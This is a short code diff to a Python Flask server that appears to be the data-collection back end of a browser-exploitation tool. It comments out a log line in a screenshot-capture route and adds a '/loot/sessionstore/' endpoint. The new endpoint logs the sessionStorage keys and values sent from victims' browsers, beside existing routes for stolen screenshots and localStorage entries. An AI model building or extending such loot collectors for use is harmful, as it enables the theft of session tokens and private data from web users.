@@ -133,7 +133,7 @@ def sendHtml2Canvas():
 # Capture screenshot
 @app.route('/loot/screenshot/<identifier>', methods=['POST'])
 def recordScreenshot(identifier):
-    print("Received image from: " + identifier)
+    # print("Received image from: " + identifier)
     #print("Looking up loot dir...")
     lootDir = findLootDirectory(identifier)
     image = request.data
@@ -214,6 +214,21 @@ def recordLocalStorageEntry(identifier):
     logEvent(identifier, "Local Storage Entry: " + localStorageKey + ", value: " + localStorageValue)
 
     return "ok", 200
+
+
+
+# Record session storage data bits
+@app.route('/loot/sessionstore/<identifier>', methods=['POST'])
+def recordSessionStorageEntry(identifier):
+    print("New sessionStorage data recorded from: " + identifier)
+    lootDir = findLootDirectory(identifier)
+    content = request.json 
+    sessionStorageKey = content['key']
+    sessionStorageValue = content['value']
+    logEvent(identifier, "Session Storage Entry: " + sessionStorageKey + ", value: " + sessionStorageValue)
+
+    return "ok", 200
+
 
 #**************************************************************************
 
